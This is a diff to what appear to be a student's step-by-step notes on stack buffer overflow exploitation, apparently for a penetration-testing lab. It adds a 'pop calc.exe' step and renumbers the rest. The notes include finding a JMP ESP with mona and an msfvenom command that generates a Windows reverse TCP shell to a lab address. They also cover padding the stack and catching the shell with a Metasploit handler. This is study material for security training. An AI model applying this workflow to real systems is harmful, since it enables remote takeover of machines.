@@ -18,17 +18,19 @@ Compare all bad chars generated and then ESP address in the crashed program vs h
 Look for jump esp instruction excluding badchars
 !mona jmp -r esp -cpb "\x00\x0A"
 
-#step 7, generate shell code
+#step 7, pop calc.exe
+
+#step 8, generate shell code
 #msfvenom -p windows/shell/reverse_tcp LPORT=1337 LHOST=10.11.0.X -b '\x00' -f ruby
 #remember to insert the bad characters in the -b section
 # TAKE NOTE OF HOW BIG YOUR SHELL CODE IS
 
-#step 8, generate space with metasm that is a little biggrt than the unpacked space of your shell code.
+#step 9, generate space with metasm that is a little biggrt than the unpacked space of your shell code.
 #not a bad idea to make it the same size as the unpacked code too
 #add esp, -1650 was good in this instance
 # DO NOT FLIP THIS ADDRESS!
 #If you get stackoverflow errors, take the space out and put a bunch of \x90 or TESTSTRINGS in to pad.
 
-#step 9, pack in the shell code generated above
+#step 10, pack in the shell code generated above
 
-#step 10, make sure to catch with a multi/handler in msfconsole
+#step 11, make sure to catch with a multi/handler in msfconsole
